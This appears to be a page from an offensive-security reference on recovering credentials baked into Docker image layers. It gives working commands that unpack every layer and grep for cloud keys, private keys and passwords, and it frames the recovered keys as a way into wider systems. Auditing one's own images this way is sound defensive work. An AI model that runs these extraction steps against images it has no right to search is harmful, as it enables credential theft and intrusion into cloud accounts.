---
title: "Secrets in image layers: extracting credentials baked into a build"
order: 1
description: "Each Dockerfile instruction creates an immutable layer, so a secret added in one step and deleted in a later one still exists in the earlier layer. An attacker unpacks an image's layers and its build history to recover API keys, private keys, and passwords that the author believed were removed, needing only read access to the image."
keywords:
  - image layers
  - docker history
  - baked secrets
  - dockerfile
  - credential theft
---

# Secrets in image layers

A container image is an ordered stack of immutable layers, one per build instruction. Deleting a file in a later layer only adds a whiteout entry; the file still exists in the layer that created it. Any secret copied in, echoed into a file, or passed as a build argument and then removed is therefore still recoverable from the image. Read access to the image, from a pull or a registry, is all that is needed to extract it.

## Reading the history and layers

```bash
# build history shows ENV, ARG, and RUN steps, including echoed secrets
docker history --no-trunc <image>
# save the image and unpack every layer to search the real filesystem contents
docker save <image> -o img.tar && mkdir img && tar -xf img.tar -C img
for l in img/*/layer.tar img/blobs/sha256/*; do tar -xf "$l" -C extracted 2>/dev/null; done
grep -rIER 'AKIA|BEGIN (RSA|OPENSSH) PRIVATE KEY|password|secret|token' extracted | head
```

Unpacking layers (rather than only inspecting the running container's merged view) is what recovers files that a later layer deleted, because each layer tar still contains them.

## Common sources of baked secrets

```bash
# build args passed with --build-arg are visible in history
docker history --no-trunc <image> | grep -i 'ARG\|ENV'
# credential files COPYed in then removed survive in the adding layer
# .git directories, .env files, and SSH keys are frequent finds
find extracted -name '.env' -o -name 'id_*' -o -name '.netrc' -o -path '*/.git/config'
```

## Exploitation notes

- Always unpack and search layers, not just the final filesystem: the merged view hides deleted secrets that the per-layer tars retain.
- Build arguments are a frequent leak because authors treat them as transient, yet they are recorded in the image history in clear text; `--build-arg` secrets are recoverable by anyone who can read the image.
- Recovered cloud keys and private keys often unlock far more than the container; triage them first. Pair with [Registry access](registry-access.md) to reach private images at scale.

## Tools

- [dive (layer explorer)](https://github.com/wagoodman/dive)
- [trufflehog (secret scanning, supports docker images)](https://github.com/trufflesecurity/trufflehog)

## References

- [Docker: image layers and history](https://docs.docker.com/build/guide/layers/)
- [OWASP: secrets in container images](https://owasp.org/www-project-docker-top-10/)
